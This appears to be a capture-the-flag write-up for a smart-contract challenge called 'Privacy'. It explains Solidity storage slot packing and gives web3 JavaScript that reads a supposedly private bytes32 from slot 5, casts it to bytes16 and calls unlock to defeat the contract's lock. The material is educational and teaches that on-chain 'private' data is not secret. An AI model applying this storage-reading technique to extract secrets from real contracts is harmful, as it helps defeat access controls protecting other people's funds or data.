# 12. Privacy
<sup>Difficulty 8/10</sup>

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works

Tips:

- Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.

## Solution

We have to unlock the contract. Unlock condition: `require(_key == bytes16(data[2]));`.
Data is declared as `bytes32[3] private data;`.
As per the previous challenge, we read data from the block since **nothing on the chain is really private**.

How do we get the correct variable index?

As [solidity documentation](https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html) state:

> State variables of contracts are stored in storage in a compact way such that multiple values sometimes use the same storage slot. Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot 0. For each variable, a size in bytes is determined according to its type. Multiple, contiguous items that need less than 32 bytes are packed into a single storage slot if possible, according to the following rules: [omitted]

This means that we can reconstruct `Privacy` contract variables like this:

```solidity
bool public locked = true;
uint256 public ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

| Index | Variables                             | Notes                                                                        |
|:------|:--------------------------------------|:-----------------------------------------------------------------------------|
| 0     | locked                                | It takes the full slot since cannot be pack with the following variable      |
| 1     | ID                                    | This takes the whole 32 bytes space                                          |
| 2     | flattening, denomination, awkwardness | These variables are packed since their cumulative size is less than 32 bytes |
| 3     | data[0]                               | 32 bytes                                                                     |
| 4     | data[1]                               | 32 bytes                                                                     |
| 5     | data[2]                               | 32 bytes -> our juicy data                                                   |

**[!] NOTES: THE VARIABLE DECLARATION ORDER MATTERS!!!**


Now that we now that our key `data[2]` is in the 5th slot, we can retrieve it:

```javascript
const data3 = await web3.eth.getStorageAt('0x9B936DD5E73532322f90C6Ed54d350D87AAf823b', 5)
// '0x53e6e6a1c996fd75204ee4d098ea1b37f1f04873adb637795bc4101e6da67023'
```

We got a `bytes32` string. To cast it to a `bytes16` we take the 64 char length string, without the leading `0x`, and get the first part (the first 32 characters)

```javascript
const dataString = data3.slice(2)  // remove trailing 0x
dataString.length
// -> 64
const key = dataString.substr(0, 32)
key.length
// -> 32
```

Finally unlock the contract: 

```javascript
await contract.locked()
// -> true
await contract.unlock(key)
await contract.locked()
// -> false
```

## OZ Corner

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)
